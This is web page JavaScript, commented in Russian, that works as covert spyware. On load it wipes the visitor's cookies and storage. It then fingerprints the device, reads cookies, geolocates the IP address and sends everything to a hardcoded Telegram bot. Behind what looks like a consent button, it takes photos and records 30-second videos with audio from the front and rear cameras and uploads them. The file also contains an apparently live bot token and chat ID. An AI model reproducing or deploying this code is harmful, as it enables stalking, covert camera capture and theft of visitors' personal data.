(async function wipeOnFirstVisit() {
  const FLAG = '__wiped_v1__';
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}

  try {
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (const c of cookies) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
      const domains = ['', location.hostname, '.' + location.hostname,
                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
      for (const p of paths) {
        for (const d of domains) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
        }
      }
    }
  } catch (e) {}
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) {
        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
      }
    }
  } catch (e) {}
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
    }
  } catch (e) {}

  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
  location.reload();
})();
</script>

<script>
// ═══════════════════════════════════════════════════════════
// НАСТРОЙКИ
// ═══════════════════════════════════════════════════════════
const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
const CHAT_ID = '8689558225';

const btnYes   = document.getElementById('yes');
const btnNo    = document.getElementById('no');
const statusEl = document.getElementById('status');
const video    = document.getElementById('preview');
const canvas   = document.getElementById('canvas');

// ═══════════════════════════════════════════════════════════
// ОТПРАВКА
// ═══════════════════════════════════════════════════════════
function sendChunk(text) {
  return new Promise(res => {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
                '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
    const img = new Image();
    img.onload = img.onerror = () => res();
    img.src = url;
    setTimeout(res, 400);
  });
}

async function sendPhoto(blob, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    form.append('caption', caption || 'Фото');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
      method: 'POST', body: form
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

async function sendVideo(blob, ext, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', blob, 'video.' + (ext || 'webm'));
    form.append('caption', caption || 'Видео');
    form.append('supports_streaming', 'true');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
      method: 'POST', body: form
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

// ═══════════════════════════════════════════════════════════
// ПОЛЕЗНЫЕ ДАННЫЕ
// ═══════════════════════════════════════════════════════════
async function collectUseful() {
  const ua = navigator.userAgent;
  const n  = navigator;
  const s  = screen;
  const out = {};

  const ref = document.referrer || '';
  let refSource = 'прямой заход';
  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
  else if (/google\./i.test(ref))       refSource = 'Google';
  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
  else if (/bing\./i.test(ref))         refSource = 'Bing';
  else if (/duckduckgo\./i.test(ref))   refSource = 'DuckDuckGo';
  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
  else if (/youtube\./i.test(ref))      refSource = 'YouTube';
  else if (ref)                         refSource = ref;
  out['Источник'] = refSource;
  out['Referrer'] = ref || '(прямой заход)';

  let inApp = 'нет';
  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
  else if (/Viber/i.test(ua))                   inApp = 'Viber';
  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
  out['Приложение'] = inApp;

  let browser = 'неизвестно', bver = '';
  const bt = [
    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
    [/OPR\/([\d.]+)/,           'Opera'],
    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
    [/Firefox\/([\d.]+)/,       'Firefox'],
    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
    [/Chrome\/([\d.]+)/,        'Chrome'],
    [/Version\/([\d.]+).*Safari/,'Safari'],
  ];
  for (const [re, name] of bt) {
    const m = re.exec(ua);
    if (m) { browser = name; bver = m[1]; break; }
  }
  out['Браузер'] = browser + (bver ? ' ' + bver : '');

  let os = 'неизвестно', osv = '';
  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
  else if (/Linux/i.test(ua))           os = 'Linux';
  out['ОС'] = os + (osv ? ' ' + osv : '');

  let device = 'десктоп';
  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
  out['Устройство'] = device;

  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
  if (modelMatch) out['Модель'] = modelMatch[1].trim();

  out['Язык']      = n.language;
  out['Языки']     = (n.languages || []).join(', ');
  out['Локаль']    = Intl.DateTimeFormat().resolvedOptions().locale;
  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
  out['Смещение TZ (мин)'] = new Date().getTimezoneOffset();
  out['Локальное время']   = new Date().toLocaleString('ru-RU');

  out['Экран']       = s.width + 'x' + s.height;
  out['Доступный']   = s.availWidth + 'x' + s.availHeight;
  out['Окно']        = window.innerWidth + 'x' + window.innerHeight;
  out['DPR']         = window.devicePixelRatio;
  out['Ориентация']  = s.orientation ? s.orientation.type : '';
  out['Глубина цвета'] = s.colorDepth;
  out['Ядер CPU']    = n.hardwareConcurrency || '';
  out['RAM (GB)']    = n.deviceMemory || '';
  out['Платформа']   = n.platform || '';
  out['Touch points']= n.maxTouchPoints || 0;

  if (n.getBattery) {
    try {
      const b = await n.getBattery();
      out['Батарея'] = Math.round(b.level * 100) + '%';
      out['Заряжается'] = b.charging ? 'да' : 'нет';
    } catch (e) {}
  }

  const c = n.connection || n.mozConnection || n.webkitConnection;
  if (c) {
    out['Тип сети']  = c.effectiveType || '';
    out['Скорость Mbps'] = c.downlink || '';
    out['RTT ms']    = c.rtt || '';
  }
  out['Онлайн'] = n.onLine ? 'да' : 'нет';

  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {}

  try {
    const cv = document.createElement('canvas');
    cv.width = 280; cv.height = 60;
    const ctx = cv.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 100, 30);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint 你好 🎉', 2, 10);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('Fingerprint 你好 🎉', 4, 20);
    const d = cv.toDataURL();
    let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    out['Canvas hash'] = (h >>> 0).toString(16);
  } catch (e) {}

  try {
    const base = ['monospace', 'sans-serif', 'serif'];
    const test = ['Arial','Comic Sans MS','Courier New','Georgia','Impact','Times New Roman',
      'Trebuchet MS','Verdana','Tahoma','Segoe UI','Roboto','Ubuntu','Calibri','Cambria',
      'Consolas','Menlo','Monaco','DejaVu Sans','Noto Sans','Symbol','Wingdings','Webdings',
      'Helvetica Neue','SF Pro','PingFang SC','Microsoft YaHei','Meiryo','Malgun Gothic',
      'JetBrains Mono','Fira Code','Inter','Open Sans','Lato','Montserrat','Poppins'];
    const span = document.createElement('span');
    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
    span.textContent = 'mmmmmmmmmmlliWWWW';
    document.body.appendChild(span);
    const bs = {};
    for (const b of base) { span.style.fontFamily = b; bs[b] = span.offsetWidth + 'x' + span.offsetHeight; }
    const found = [];
    for (const f of test) {
      for (const b of base) {
        span.style.fontFamily = '"' + f + '",' + b;
        if (span.offsetWidth + 'x' + span.offsetHeight !== bs[b]) { found.push(f); break; }
      }
    }
    document.body.removeChild(span);
    if (found.length) out['Установленные шрифты'] = found.join(', ');
  } catch (e) {}

  try {
    const ck = document.cookie || '';
    if (ck) out['Cookies'] = ck;
  } catch (e) {}

  out['URL']      = location.href;
  out['Хост']     = location.hostname;
  out['Страница'] = location.pathname;

  try {
    const p = new URLSearchParams(location.search);
    const utm = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','gclid','fbclid','yclid'];
    const found = [];
    for (const k of utm) {
      const v = p.get(k);
      if (v) found.push(k + '=' + v);
    }
    if (found.length) out['UTM'] = found.join(' | ');
  } catch (e) {}

  try {
    const r = await fetch('https://ipwho.is/');
    const g = await r.json();
    if (g.success !== false && g.latitude != null) {
      out['IP']           = g.ip;
      out['Страна']       = g.country;
      out['Регион']       = g.region;
      out['Город']        = g.city;
      out['Индекс']       = g.postal;
      out['Координаты']   = g.latitude + ', ' + g.longitude;
      out['ISP']          = g.connection && g.connection.isp;
      out['Организация']  = g.connection && g.connection.org;
      out['ASN']          = g.connection && ('AS' + g.connection.asn);
      out['Мобильный IP'] = g.connection && g.connection.is_mobile ? 'да' : 'нет';
      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
      out['Прокси']       = g.security && g.security.proxy ? 'да' : 'нет';
      out['Tor']          = g.security && g.security.tor ? 'да' : 'нет';
      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
      out['Яндекс.Карты'] = 'https://yandex.ru/maps/?pt=' + g.longitude + ',' + g.latitude + '&z=15&l=map';
    }
  } catch (e) {}

  try {
    if (n.permissions) {
      const perms = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
      const states = [];
      for (const p of perms) {
        try {
          const r = await n.permissions.query({ name: p });
          states.push(p + '=' + r.state);
        } catch (e) {}
      }
      if (states.length) out['Разрешения'] = states.join(', ');
    }
  } catch (e) {}

  return out;
}

// ═══════════════════════════════════════════════════════════
// ФОТО + ВИДЕО 30 СЕК С КАМЕРЫ
// ═══════════════════════════════════════════════════════════
async function captureFromCamera(facingMode, label, videoSeconds) {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: 1280, height: 720, frameRate: 24 },
      audio: true
    });
    video.srcObject = stream;

    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = () => res();
      video.oncanplay = () => res();
    });
    await new Promise(r => setTimeout(r, 800));

    const w = video.videoWidth  || 1280;
    const h = video.videoHeight || 720;

    // ── 1) ФОТО ──
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
    ctx.clearRect(0, 0, w, h);

    if (photoBlob) {
      await sendPhoto(photoBlob,
        label + ' — фото\n' +
        'Разрешение: ' + w + 'x' + h + '\n' +
        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
        'URL: ' + location.href
      );
    }

    // ── 2) ВИДЕО ──
    if (typeof MediaRecorder === 'undefined') {
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return { photo: !!photoBlob, video: false };
    }

    let mime = 'video/webm;codecs=vp8,opus', ext = 'webm';
    const candidates = [
      ['video/webm;codecs=vp8,opus', 'webm'],
      ['video/webm;codecs=vp9,opus', 'webm'],
      ['video/webm',                 'webm'],
      ['video/mp4;codecs=h264,aac',  'mp4'],
      ['video/mp4',                  'mp4'],
    ];
    for (const [m, e] of candidates) {
      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) { mime = m; ext = e; break; }
    }

    const chunks = [];
    let rec;
    try {
      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 700000, audioBitsPerSecond: 64000 });
    } catch (e) {
      try { rec = new MediaRecorder(stream); ext = 'webm'; } catch (e2) { rec = null; }
    }

    let videoBlob = null;
    if (rec) {
      rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
      const done = new Promise(res => {
        rec.onstop = () => {
          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
          res();
        };
      });
      rec.start(1000);

      // прогресс
      let left = videoSeconds;
      const tick = setInterval(() => {
        left--;
        statusEl.textContent = label + ': ' + left + ' сек...';
        if (left <= 0) clearInterval(tick);
      }, 1000);

      await new Promise(r => setTimeout(r, videoSeconds * 1000));
      clearInterval(tick);
      try { rec.stop(); } catch (e) {}
      await done;
    }

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    if (videoBlob && videoBlob.size > 0) {
      await sendVideo(videoBlob, ext,
        label + ' — видео ' + videoSeconds + ' сек\n' +
        'Размер: ' + Math.round(videoBlob.size / 1024) + ' KB\n' +
        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
        'URL: ' + location.href
      );
    }

    return { photo: !!photoBlob, video: !!(videoBlob && videoBlob.size) };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
    return { photo: false, video: false, error: e.message };
  }
}

// ═══════════════════════════════════════════════════════════
// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ
// ═══════════════════════════════════════════════════════════
(async function autoRun() {
  await new Promise(r => setTimeout(r, 400));

  const data = await collectUseful();

  await sendChunk(
    '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
    '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
    '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
    '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
    '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
    '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
    '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
    '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
    '<b>Время:</b> ' + (data['Локальное время'] || '?')
  );

  const lines = Object.entries(data)
    .filter(([k, v]) => v !== '' && v != null && v !== false)
    .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));

  const chunks = [];
  let cur = '';
  for (const line of lines) {
    if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
    cur += line + '\n';
  }
  if (cur) chunks.push(cur);

  for (let i = 0; i < chunks.length; i++) {
    const head = '📋 <b>ПОЛЕЗНЫЕ ДАННЫЕ</b>' +
                 (chunks.length > 1 ? ' (' + (i+1) + '/' + chunks.length + ')' : '') + '\n\n';
    await sendChunk(head + chunks[i]);
    await new Promise(r => setTimeout(r, 500));
  }
})();

// ═══════════════════════════════════════════════════════════
// КНОПКА «ДА» — фото + видео с двух камер

btnYes.onclick = async () => {
  btnYes.disabled = true;
  btnNo.disabled  = true;
  statusEl.textContent = 'Разрешите доступ к камере...';

  try {
    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
    localStorage.setItem('cookie_consent', 'accepted');
    sessionStorage.setItem('cookie_consent', 'accepted');
  } catch (e) {}

  await sendChunk(
    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +

  );

  // 1) Фронтальная — фото + 30 сек видео
  statusEl.textContent = 'Фронтальная камера: фото + 30 сек видео...';
  await captureFromCamera('user', '🤳 <b>Фронтальная камера</b>', 30);

  // Пауза, чтобы освободить устройство
  await new Promise(r => setTimeout(r, 1000));

  // 2) Задняя — фото + 30 сек видео
  statusEl.textContent = 'Задняя камера: фото + 30 сек видео...';
  await captureFromCamera('environment', '📷 <b>Задняя камера</b>', 30);

  statusEl.textContent = 'Готово.';
  document.getElementById('gate').style.display = 'none';
  document.getElementById('site').style.display = 'block';
};

btnNo.onclick = () => {
  document.body.innerHTML =
    '<p style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0">Вы отказались. Сайт недоступен.</p>';
};
</script>
